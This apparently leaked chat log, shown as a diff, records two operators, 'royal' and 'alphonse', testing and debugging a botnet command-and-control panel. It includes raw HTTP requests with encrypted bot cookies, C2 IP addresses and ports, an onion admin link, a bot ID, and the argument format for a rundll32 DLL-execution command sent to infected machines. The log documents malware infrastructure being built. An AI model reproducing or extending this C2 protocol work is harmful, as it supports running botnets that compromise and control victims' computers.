@@ -1,0 +1,156 @@
+[18.08.21 13:53:02] royal: Request
+[18.08.21 13:53:05] royal: GET /web/minor/job/run HTTP/1.1
+Cookie: HSID=ZLPuvXc1iUhIWJC0QZf%2BWWFNEoAr%2FbHNhv5bNTIEpt0D%2F2NgGhPvjpYoePwazG%2BO5VSADiwKb9yAQaG%2FfVYikLdDFijHdwykCQO2R%2F9YrzZgmA3lCbHAHyTkgsEPG%2FRPbuQZN3uj0WTfqC%2Bx5hQWcZCRIgcGdc90HOMK5V6WpamaF%2FW7QAPdD92u%2BF%2F6cneRSfLRiORc6d3n%2FQUVhoSfinnQL6Y42QW996zio98vv2fmT6FjTmC97fnlbp9j7u9k3uCeQVMwQY4KAh4sX2a4dZXhRg1TLVE5HGyHwGWd1ymi6louPQMR4u12jLFrNjO9YHOG8%2BFB7OB6nGjSMe7Akw%3D%3D;SIDCC=shYmuYqKBOnj2EDgYssAULXFtKuPaxtm2ymo%2BCQgargcuiD7wSBhffO%2BVsufT86SYKh8ifqESydtR6pQK9NwwWobZkT7snf9vpYunfOdJijocafpmwxCmchyRhTpnpS4UEf2Imb2FyybQL2zRv4%2B8EeV0NxTanW%2BLpeOHZhrc64CTgzpvGgqzHsWenUiG1O5Q9UymrL99E%2FPP8r7HNmX1iev8KMAxuHwabNO6E881pRpZ%2BryJ6IApDEvQky8viEa8kEj1ThSUiDcxzz%2FEW%2BZGn3VzhPrNYa%2FvbS99a5dHTTON04ifVTGCRgyXGAGzwhC4qRXRaEC%2FmwUYgYdm2T4Ug%3D%3D;SID=BfmX%2BUO7l7YX0WCfLAEe0%2FeU8mQDLYl0NaH8nJ3fjveTVRSdOk7cuquwjSCdR2DzXFjptv4r4jOcB6ECToUIDMJrSLXpDDVDqKvXEzW%2F0kyMsf%2FnBfNI5ATbJzk3WxWN46tQCmZCViMENEEYuqhU8S6h%2FWMRL0L7nuJIg0QfR1ZvtrWun3rpqKKdleMkJ1EpHvKB1iMZ8MmsHNHwCya8PzLkbMLCfvhH0os09hUe5Z5EvGVajVLrpzwiVr%2BDcevFaQxGfVquH3Q8M6Gg1An4gT%2FoUzzBU6D9mWl4CuJbB5C6UVHZcpaH5ukniDGEdkb9uRS%2FhxU0%2F7XQXpGfDWxwfA%3D%3D;SSID=Z075OLLKnUDK%2Ffz1fywZ74vnVl7TajsPTPVi56Go9Ckht9q8Re%2F6zLNnVJsJh9qH4t%2Fh%2FgbVrqmtQ4a1nqrL%2FSxTcD%2F8zmfAfQTiHXlqo%2FObLGFEgRN20K%2FUaJ4UdmyvpxuASlrR80CPoHW3zzmbgffgsZ9RJd1ZPo9MOM2v70BGTGgMCCwJY9BcbfzI7OZc6Fa%2Bv0j7X2KT%2F6AJ16j8yaBV0Gt1O1eWS1AyxDgCa1fgiXMuUJ5ekhl6RlxHKb1PhtXuBvQP8rZ8jAiXSmE4xO%2FzRYmE6%2BSDBbN5Q9tqbH3a6NXvp4%2F4j2R63AbSrGZrjk9fgdM33bK1WbpDQZcaXQ%3D%3D;
+X-Tag: 9K90mavjPO2Rw5ffuwOmBbAcPyM67auqhSACMKpm9LWUrKZGLtLb%2FdE6N6Jd3ZjmoO3IKdtAQaRKzgVG68MzZXt2Z9VkmTfqwuwhSj5t81By%2FqKHaatRuL2u3az4ZlE5dB74Gx4guFHJtfCMzaiZlrKjckwZL%2FFi0V%2BZB9KnnQfM0CpB786SFbSVl3xgHjtaJwAK0VX3MDGaHeD6%2Fju3SnkzI5fKZwzOClgKeHH17GmKwtbQX4FJXy%2FVd4jShVIj8IsR2K7LZ8hsznS6Gy5FWGJB9SU4PrggkLchZRJFt24bXer8xBfYsq5HJsytCjBwC4Dq%2F%2BTNm3e4EmgINoAIjw%3D%3D
+X-Csrf-Token: gf%2BanaXEv%2F1WiWkPJxwVgJOxBRSZE5ddcPFpngeHmD1VB2xnnLIvBRxydChWyl99Jjbj0FzEDQwehRFaGGhZymFwoBbXam1PkKnGBYSF7u%2B2BZJNz8VRZM0A2u%2FPbhPXsxp8DlabRKfeJTc%2BEkf8HPDZy%2BW3d8dCLcSZe%2FhrfyqAKuLI82vPaGZu9v9evLnJeGVYuttm%2BqKb4yML29FWflVjInKCIlRD1QQokFUh%2FDKCalag82aHuq5B56L6rS%2BxWbCirADXwowsLIQt%2FRCNLfTVwy6WoQA%2BfkzfvPdMnpXyMm9EuwlyjihsHwWGUqH2WNBiheDQXc0%2Fequa8Kx3sg%3D%3D
+X-Request-ID: 1kta5asCcEqcgm3fBoxHPuiXIzcHt4FXmuldFHyEfoPJWwcvk5ThhAlFWjW5SDkLGovsbAygyPO15KZrx9DApTLMiv7zK7REzZOThyG5uSOgkCnx8BCncN8zxLKgphNg1YE7rb5pq3Aq4iIrSGOirWOgU2T6iMYgBPo4pKU8nvOi6YsFNvhph8oR1koSFX%2FuV1RMo9KTP6%2F9JN2mzJa1R3lDn24R%2FTLg71xf%2F0N4apCJ2ylLLcogoQQZl2NSr%2FPmRzlEwWXE6bAMFqyZYu9JtpO%2BgY37We8hkkMEfguV8ziqa8zsay4xh%2BWLfwgZyvg8OiKEcikwzu95TRnBvY9XqQ%3D%3D
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+[18.08.21 13:53:20] alphonse: ok. now
+[18.08.21 13:58:54] royal: I think they've removed my address from exceptions again and the padlock won't let me in.
+[18.08.21 13:59:22] royal: But it's not certain.
+[18.08.21 13:59:45] royal: What is Networks global rules?
+[18.08.21 14:00:02] royal: My tst2 group is not there they say.
+[18.08.21 14:00:09] royal: Can this affect it?
+[18.08.21 14:00:31]
+[18.08.21 14:01:02] royal: So someone took it out of there a half an hour ago, it was working this morning.
+[18.08.21 14:02:01] alphonse: what do you need there? a white list for all countries?
+[18.08.21 14:02:30] royal: What's the problem?
+[18.08.21 14:02:40] royal: Is your query working?
+[18.08.21 14:03:50] royal: I'm getting
+{
+  "name": "Internal Server Error",
+  { "message": "An internal server error occurred.",
+  { "code": 0,
+  { "status": 500
+}
+[18.08.21 14:04:32] royal: When the gasket wouldn't let in there was a code 504 always.
+[18.08.21 14:04:37] alphonse: which content cookie?
+[18.08.21 14:04:45] royal: The first one.
+[18.08.21 14:06:01] alphonse: 404 answers me
+[18.08.21 14:06:05] alphonse: what command is there? /2. ?
+[18.08.21 14:07:44]
+[18.08.21 14:16:07] royal: If anything bot and keys loaded in group 16.
+[18.08.21 14:16:20] alphonse: is it working?
+[18.08.21 14:16:35] royal: the first cookie decrypted with the key that there.
+[18.08.21 14:16:38] royal: Now.
+[18.08.21 14:16:49] royal: Yes.
+[18.08.21 14:16:59] alphonse: I had a bug in my skull query
+[18.08.21 14:17:02] royal: What was it?
+[18.08.21 14:17:10] royal: Got it.
+[18.08.21 14:17:25]
+[18.08.21 14:20:05] royal: To reset. Good thing you fixed it.
+[18.08.21 14:24:14] royal: botadmin is you?
+[18.08.21 14:24:24] royal: My bot doesn't work all the time.
+[18.08.21 14:24:37] royal: If you need to check the command, write and I'll run it.
+[18.08.21 14:24:51]
+[18.08.21 14:25:08] alphonse: I postman with your request
+[19.08.21 14:00:16] royal: Hi. For protocol 1 do you need a new key every day?
+[19.08.21 14:00:28] alphonse: hi. yes
+[19.08.21 14:00:32] royal: If there is no 404?
+[19.08.21 14:00:51] alphonse: the key must be new every day
+[19.08.21 14:00:57] alphonse: if it's missing - 404
+[19.08.21 14:08:24]
+POST /1a25650db9674df5125d8a536245d2b4/4 HTTP/1.1
+Cookie: group=16
+[19.08.21 14:08:24] royal: 404 in reply.
+[19.08.21 14:09:31] royal: > POST /1a25650db9674df5125d8a536245d2b4/4 HTTP/1.1
+> Host: 165.22.25.174
+> User-Agent: insomnia/2021.4.1
+> Cookie: group=16
+> Accept: */*
+> Content-Length: 0
+[19.08.21 14:12:49] royal: Does it accept empty POSTs?
+[19.08.21 14:25:39] royal: Doesn't accept non-blank ones either.
+[19.08.21 14:35:10] royal: Or maybe because bot 1a25650db9674df5125d8a536245d2b4 is considered dead?
+[19.08.21 14:38:41]
+[19.08.21 15:26:53] alphonse: this bot is really in tst11 group
+[19.08.21 15:27:52] royal: Yes.
+[19.08.21 15:28:12] alphonse: Cookie: group=16
+[19.08.21 15:28:12] royal: That has no effect.
+[19.08.21 15:28:13] alphonse: ?
+[19.08.21 15:29:12] royal: Has something changed?
+[19.08.21 15:29:20] alphonse: nothing.
+[19.08.21 15:29:27] alphonse: just the crash pad
+[19.08.21 15:29:32] royal: That's how you remember the first group.
+[19.08.21 15:29:55] royal: And then you can send any group.
+[19.08.21 15:30:32] royal: I made a request with Cookie: group=tst11
+[19.08.21 15:30:42] royal: The same 404.
+[19.08.21 15:41:13]
+[19.08.21 15:42:05] alphonse: request doesn't reach admin
+[19.08.21 15:42:15] royal: Got it.
+[25.08.21 13:30:02] alphonse: hi
+[25.08.21 13:30:15] alphonse: request /2. with cookies
+[25.08.21 13:31:27] royal: Now.
+[25.08.21 13:31:45] royal: Will be for group tst2.
+[25.08.21 13:31:59] okay.
+[25.08.21 13:35:24] royal: GET /api/v8 HTTP/1.1
+Cookie: HSID=xf99T%2BcgiNa6%2FPC4hs2yFxXGh9kQU245yNjNWIxnOf4eoDZGb92uzjkWp%2B1MdgtQiRuudvDZsJoS9NARzvJT4anXcGtkB%2BTw1cISIgIqxIhRVeSZHVAiBTUCL70wF48jgZ7neEQXsotgAFFTNcXjwDLI3vPE5eFDXWxDh1jAK51EaGvMF7G0%2BoCVVkDCzuYJFBUBWwhiEk5eLlbnxCzcOdTENSJZFfsBbRxN%2BcJ7IUulsjGRrrqvosnOyyXuR1frKLaGAAq0aH0gsHGFD9eZmM8mqb431V27qrnXcV%2BZF6oh5GlovAc8TEQalfdkJCnFCEh5PC8P24cOcjb4UCyvKg%3D%3D;SIDCC=PziugMxJaTJMpIPNci0W53A1zYA0omESUSqIrrphmQsham%2BRAxA2Sal60ZNnGjGLu9v4Y8XuaIiigH5eJ1R6tz7hIcQqG6Q0fbSR%2F5FGE8y%2FOEMbeIfVln4fKfq3%2BTsNez%2F6D1jtQuBc%2FV8jh4K0WIp82GOq%2B%2Bqb7h7yiSYYGsI5o%2Fj%2FDQ0dN91waoKiByt1IVQPlN6SE4vE4QXndoHGKIxGm9vEYckZBjloa4PpEtkXOP9NuvkNke%2FRha3UjN8mkusTFtRRSXGWiekSMYmDCifMzhkpCMZmXQ%2B4mngkKCVbh51MSAGYXCRsmJUPxCTVok%2BdvmocV7Y0sZ0loUcACw%3D%3D;SID=ZYOHMSAyEBEEeWV3V%2FWxw2ZAi3PQaOfPWXtMK7d6GrxVUuIuJvsKvZkw0mZLpI5ayl%2FAMTbKkEVqwTrmPXlfpaTe%2BQZ9vv1LIJu04CApkxh6ZVOJwFFaHiHEU6vbRxiQ6%2FCk19A1wd3oMLYmBr1op1LI1E4Yzxy%2Bha9Skwgy%2BmUKkfbk4vYoDf3ntCXG1qEwO2VW7PKMzr5RPGpPxnjBt7WBaxK6fqpTWdTUEmxEPx7ib56bX1dpbaafOcagoxNoCZjGp751g7%2BOQSa4RL%2F8Cwx4B0cesOpPgITGUAv2ukmuOHIJN7QS1zyDaxMkViFz5r%2BHHgRO3bdXWv8E4ePDYw%3D%3D;SSID=fchHvwtZ32HgoQ4AMWZgjljCjCxr1WAzEBc6UJhMPT1eit4PQQDNzFBuUssohQoSCYhWzPUOsdjN9AMmTkH68gq6HQNcnW9QA6pURw87VsdwBHqSWMdZsBYzADfKhadvBdt2Dkudd96ATQNjqw%2BjHX02J%2F5tO5nbnWnefPxqNo8%2Be5078yYJ7uS8kG5CdPzqbZRvuati%2F7Ne9Mi5tz9AIPqJMFatBdj1IlguMDlwvCpWxrKIQF054jP2BKdNE%2FRKGUogtmJpsixAJBAgwHQ84uzS9Xox7EUpUub%2FOefdosFmQoWEcJQCIQBbb9CrNz6pH%2F5251KgloQnJui%2BvHBPXQ%3D%3D;
+X-Tag: 0IKOWsSk9AjW6iFwZNq36%2FmeP2y4p9RToiIfeH4%2BJpjlyeMYkPaIfwvrOJ%2BhRVTyiBuJ5CIHf%2BvnPyesiCx9GaN16qzTGgdFmsFPTQzwPZpATfUOe0yx8PUTR%2BBOThABpSSNGBgeM73Tev7i%2Bo7KoBK%2FrGZ1KDlMLSQcK2JX0Pv5H6LFTBMKXtmr3HMgG%2FAjHnOH3D51Z1FYsEmi%2BijY28fkK5ZUel1yw1tPsn0CYgpTQgc8H07MlfucjobK8NfJhtOb4rDX0YiX89hz1sCPIcqtHE2xDZTbihGcCJjivGKuAYAPQ7X6Pf32mP%2F73srtqph2lssaKz2S7Ym9QPM%2Fgw%3D%3D
+X-Csrf-Token: 33kFYjjieNyS71A4ZI8r9cbNHyVAqmoQyTsHOyJXQIxFYCClV3RvVLyET4%2Bi9hZOEYGvue3UgSY1XAMx24SeFtNXnRS1TRwBNGxcNtQtKwuRdZ6QUWbc31JRQjoVZzx6DXD3R35voeHjRVEktrs1mQRhosCwOalprATqln%2FnYKBPbyS5%2BeRHnDETSMy%2BPwBTysVFYw%2BMlNj2NmP%2FfhUido15tcQGL5WYZozaH54JbnxmhcjBrjnTiKVY6obPjK0undZMsnI4u51TEIHXjfuBsWNwWV0GbvSsPie%2F5NW6GJcNq0yQPDk5ntiWTtXr9kSw2JKirs5Rlb7tIBpbaHgh6A%3D%3D
+X-Request-ID: qaS793PHUa59B9pq3FGl8twV%2FZDExMmu0XwHSNWcKiidI87bCpj2w6PCSeuGZKzygsPiiU1pfAKHy%2BMIXP5a0R7xA%2BDiLPIWCF0kSAlxoxwbLxHjU3V48XsriGtR9RrwDGTOXPXph0%2BAeE4E8M%2B9YhFf5ExDBU1aVxYBCtfDtfP%2FBDNcqDE%2BJAQ9nrtkL7mLekhhLHgpuejx%2B%2BmNvT3zFgfquylLtJdyQM5ssPOcMXQOyKDzaEVXOPL%2BAgdhsF4xy1899fOFDZvItuqvVwwVnmUMqJhjX7qP44o11jJ0m7fLGzwaH%2FCnpgpxjBSpJ7y4x9U%2BKOeLJOAdyka49ACZJQ%3D%3D
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+[25.08.21 13:37:25] alphonse: thanks. which one is the important cookie?
+[25.08.21 13:37:55] royal: Always the first one. The gaskets spoil them if not the first.
+[25.08.21 13:38:05] royal: If it's not fixed.
+[25.08.21 13:39:28] alphonse: the same bot? 1a25650db9674df5125d8a536245d2b4
+[25.08.21 13:39:38] alphonse: can it be killed and recreated?
+[25.08.21 13:41:56] royal: You can.
+[25.08.21 13:42:20] royal: It's a test one, you can do what you want with it.
+[25.08.21 13:46:41] royal: Can you create it by yourself?
+[25.08.21 13:53:59]
+[26.08.21 09:08:38] royal: Hi. I have code 500 on command request.
+[26.08.21 09:08:54] royal: Could the fact that you deleted the bot yesterday have affected it?
+[26.08.21 09:13:58] royal: 1a25650db9674df5125d8a536245d2b4
+[26.08.21 09:15:31] royal: Found it in honeypots. Put it into test bots and it worked.
+[20.09.21 12:17:59] royal: Hi. How do I send requests to test admin?
+[20.09.21 12:18:10] royal: I send to her address.
+[20.09.21 12:18:31] royal: I get 404.
+[20.09.21 12:19:55] alphonse: always or when you try to start rundll?
+[20.09.21 12:20:09] royal: Command prompt.
+[20.09.21 12:20:30] alphonse: where do you knock?
+[20.09.21 12:20:46] royal: https://217.12.204.65
+[20.09.21 12:21:13] alphonse: port 12233 ?
+[20.09.21 12:21:26] royal: 443
+[20.09.21 12:21:52] alphonse: yes. api bot there 12233
+[20.09.21 12:22:29] royal: Got it. It works.
+[20.09.21 12:27:39] alphonse: so far validation of bot registry commands is not working correctly.
+[20.09.21 12:29:28] royal: I haven't checked rundll yet.
+[20.09.21 13:56:00] royal: I get this on rundll command:
+11 60 TestOutput64.dll Run
+[20.09.21 13:56:13] royal: It should be 11 %runtype% %timeout% %pid% %cmdline%
+[20.09.21 13:56:24] royal: There is no runtype% number
+[20.09.21 13:56:37] royal: File name should not be there.
+[20.09.21 13:56:53] royal: pid must be 0 if not specified.
+[20.09.21 13:57:50] royal: Runtype selected in admin Rundll32
+[20.09.21 13:58:44] royal: It should be "11 0 60 0 Run"
+[20.09.21 14:02:41] royal: Everything works the same there no matter what you choose in runtype list.
+[20.09.21 14:02:57] alphonse: I got it.
+[9/20/21/221 14:03:01] royal: Wrong commands.
+[22.09.21 12:16:53] alphonse: hi
+[22.09.21 12:17:08] alphonse: if you have time, run it on 65 dll
+[22.09.21 12:17:19] alphonse: what will the bot get?
+[22.09.21 12:17:36] royal: Hi. I'll check it now.
+[22.09.21 12:23:50] royal: 11 0 60 TestOutput64.dll Run
+[22.09.21 12:24:58] royal: filename comes in the place where pid should be
+[22.09.21 12:25:08] royal: 11 %runtype% %timeout% %pid% %cmdline%
+[22.09.21 12:25:35] royal: If there is no pid, 0 should be.
+[22.09.21 12:25:45] royal: And file name should not be there at all.
+[22.09.21 12:31:51] royal: If I specify a pid, it goes like this:
+11 3 60 TestOutput64.dll 101
+[22.09.21 12:32:15] royal: File name shifts pid further to the right.
+[22.09.21 12:32:57] royal: File name shifts pid further to the right.
+[22.09.21 12:34:55] royal: In general, file name is redundant everywhere in commands, and it messes up the sequence of parameters in the command.
+[22.09.21 12:35:10] royal: If you remove it, everything will be correct.
+[22.09.21 12:58:33] alphonse: does the bot still work?
+[22.09.21 13:02:31] royal: No.
+[22.09.21 14:42:11] alphonse: if you have time, try another 11
+[23.09.21 08:51:59] alphonse: hi. look again rundll at 65
+[9/23/221 08:52:29] royal: Hi. Okay. In about 20 minutes.
+[23.09.21 09:23:26] royal: All rund dll commands come as they should.
+[9/23/221 09:23:39] alphonse: ok.
+[01.11.21 07:56:32] royal: https://x6rciduomtjt25xigz7onkgxmusuwwuxqvidjkcramwg3lb5vvpsm7ad.onion
+[01.11.21 07:57:19] royal: Same for bots, honeypots, test bots, important. Same error.
+[01.11.21 07:59:20] royal: https://x6rciduomtjt25xigz7onkgxmusuwwuxqvidjkcramwg3lb5vvpsm7ad.onion/dAkEAkFKkzm8QTA3vk1zyS50ArYk8y4le4HtJ6UaWHtus/
+[01.11.21 07:59:30] royal: Full link.
+[01.11.21 11:41:46] alphonse: on which bot do dlls flop?
+[01.11.21 11:42:02] royal: 1a25650db9674df5125d8a536245d2b4
